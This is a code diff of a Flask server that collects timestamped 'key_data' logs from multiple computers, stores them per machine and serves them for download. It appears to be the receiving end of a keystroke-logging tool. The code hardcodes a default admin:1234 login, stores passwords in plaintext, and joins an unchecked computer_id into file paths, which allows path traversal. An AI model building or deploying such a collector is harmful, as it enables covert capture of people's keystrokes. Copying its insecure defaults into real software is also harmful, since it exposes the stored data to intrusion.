@@ -2,49 +2,43 @@ from flask import Flask, request, jsonify
 from flask_cors import CORS
 import json
 import os
+from datetime import datetime
 
 # Initialize Flask app
 app = Flask(__name__)
 CORS(app)
 
-# 📌 Storage directory and file paths
+# 📌 Storage directory
 SAVE_DIR = "received_files"
-FILE_PATH = os.path.join(SAVE_DIR, "received_data.json")  # Logs file
-USER_FILE = os.path.join(SAVE_DIR, "users.json")  # Users file
 os.makedirs(SAVE_DIR, exist_ok=True)  # Create directory if it doesn't exist
 
 # ==============================
 # 🔹 Utility Functions
 # ==============================
 
-def load_json_file(filepath, default_data):
-    """Loads a JSON file if it exists, otherwise returns default data."""
-    if os.path.exists(filepath):
-        try:
-            with open(filepath, "r", encoding="utf-8") as f:
-                data = json.load(f)
-                return data if isinstance(data, dict) else default_data
-        except (json.JSONDecodeError, IOError) as e:
-            print(f"❌ Error loading {filepath}: {e}")
-            return default_data
-    return default_data
-
-def save_json_file(filepath, data):
-    """Saves data to a JSON file."""
+def save_logs(computer_id, logs):
+    """Saves logs to a file using the correct timestamps from the client."""
     try:
-        with open(filepath, "w", encoding="utf-8") as f:
-            json.dump(data, f, indent=4, ensure_ascii=False)
-    except IOError as e:
-        print(f"❌ Error writing {filepath}: {e}")
+        today_date = datetime.today().strftime("%Y-%m-%d")
+        computer_dir = os.path.join(SAVE_DIR, computer_id)
+        os.makedirs(computer_dir, exist_ok=True)
+        file_path = os.path.join(computer_dir, f"{today_date}.jsonl")
 
-# Load existing data from files
-logs_data = load_json_file(FILE_PATH, {})
-users = load_json_file(USER_FILE, {}).get("users", {})
+        with open(file_path, "a", encoding="utf-8") as f:
+            for log in logs:
+                # 🔹 Use the timestamp sent by the client
+                log_entry = {
+                    "timestamp": log["timestamp"],  # Keep the correct timestamp
+                    "key_data": log["key_data"]
+                }
+                json.dump(log_entry, f)
+                f.write("\n")
 
-# If users.json does not exist, create a default admin user
-if not users:
-    users = {"admin": "1234"}
-    save_json_file(USER_FILE, {"users": users})
+        print(f"✅ Logs saved for {computer_id} in {file_path}")
+        return True
+    except Exception as e:
+        print(f"❌ Error saving logs: {e}")
+        return False
 
 # ==============================
 # 🔹 Flask Routes
@@ -52,7 +46,7 @@ if not users:
 
 @app.route('/upload', methods=['POST'])
 def upload_json():
-    """Receives and stores logs from a computer."""
+    """Receives logs from a computer and stores them."""
     try:
         data = request.get_json()
         if not isinstance(data, dict):
@@ -61,47 +55,81 @@ def upload_json():
         computer_id = data.get("computer_id")
         logs = data.get("logs")
 
-        if not isinstance(computer_id, str) or not isinstance(logs, dict):
+        if not isinstance(computer_id, str) or not isinstance(logs, list):
             return jsonify({"error": "Invalid JSON structure"}), 400
 
-        # Validate received logs
-        for timestamp, log_data in logs.items():
+        # Validate logs format
+        for log_data in logs:
             if not isinstance(log_data, dict) or 'key_data' not in log_data:
-                return jsonify({"error": f"Invalid log format for {timestamp}"}), 400
+                return jsonify({"error": "Invalid log format"}), 400
 
-        # Add logs to local database
-        logs_data.setdefault(computer_id, {})
-        logs_data[computer_id].update(logs)
-        save_json_file(FILE_PATH, logs_data)
-
-        print(f"✅ Logs stored successfully for {computer_id}")
-        return jsonify({"message": "Logs stored successfully"}), 200
+        # Save logs to file
+        if save_logs(computer_id, logs):
+            return jsonify({"message": "Logs stored successfully"}), 200
+        else:
+            return jsonify({"error": "Failed to save logs"}), 500
 
     except Exception as e:
-        print(f"❌ Server error: {str(e)}")
-        return jsonify({"error": f"Server error: {str(e)}"}), 500
+        print(f"❌ Server error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
 
 @app.route('/computers', methods=['GET'])
 def get_computers():
     """Returns a list of registered computers."""
     try:
-        return jsonify({"computers": list(logs_data.keys())}), 200
+        computers = [d for d in os.listdir(SAVE_DIR) if os.path.isdir(os.path.join(SAVE_DIR, d))]
+        return jsonify({"computers": computers}), 200
     except Exception as e:
-        print(f"❌ Server error: {str(e)}")
-        return jsonify({"error": f"Server error: {str(e)}"}), 500
+        print(f"❌ Server error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
 
 @app.route('/download/<computer_id>', methods=['GET'])
 def download_json(computer_id):
-    """Downloads logs for a specific computer."""
+    """Downloads all logs from a specific computer in JSON Lines format."""
     try:
-        if computer_id in logs_data:
-            print(f"📥 Downloading logs for {computer_id}")
-            return jsonify(logs_data[computer_id]), 200
-        else:
+        computer_dir = os.path.join(SAVE_DIR, computer_id)
+        if not os.path.exists(computer_dir):
             return jsonify({"error": "No logs found for this computer"}), 404
+
+        logs = []
+        for file in sorted(os.listdir(computer_dir)):
+            file_path = os.path.join(computer_dir, file)
+            if file.endswith(".jsonl"):  # 📌 Only read JSON Lines files
+                with open(file_path, "r", encoding="utf-8") as f:
+                    for line in f:
+                        logs.append(json.loads(line))  # 📌 Convert each line to a JSON object
+
+        return jsonify(logs), 200  # Return an array of logs
+
     except Exception as e:
-        print(f"❌ Server error: {str(e)}")
-        return jsonify({"error": f"Server error: {str(e)}"}), 500
+        print(f"❌ Server error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+# ==============================
+# 🔹 Authentication Route
+# ==============================
+
+# 📌 Fake users database
+USERS_FILE = os.path.join(SAVE_DIR, "users.json")
+
+def load_users():
+    """Load user credentials from a file or create a default one."""
+    if os.path.exists(USERS_FILE):
+        try:
+            with open(USERS_FILE, "r", encoding="utf-8") as f:
+                data = json.load(f)
+                return data.get("users", {})
+        except json.JSONDecodeError:
+            print("❌ Error reading users file, resetting to default.")
+    return {"admin": "1234"}  # Default user
+
+def save_users(users):
+    """Save user credentials to a file."""
+    with open(USERS_FILE, "w", encoding="utf-8") as f:
+        json.dump({"users": users}, f, indent=4)
+
+# Load users at startup
+users = load_users()
 
 @app.route('/login', methods=['POST'])
 def login():
@@ -119,8 +147,8 @@ def login():
             return jsonify({"error": "Invalid credentials"}), 401
 
     except Exception as e:
-        print(f"❌ Server error: {str(e)}")
-        return jsonify({"error": f"Server error: {str(e)}"}), 500
+        print(f"❌ Server error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
 
 # ==============================
 # 🔹 Run Flask Application
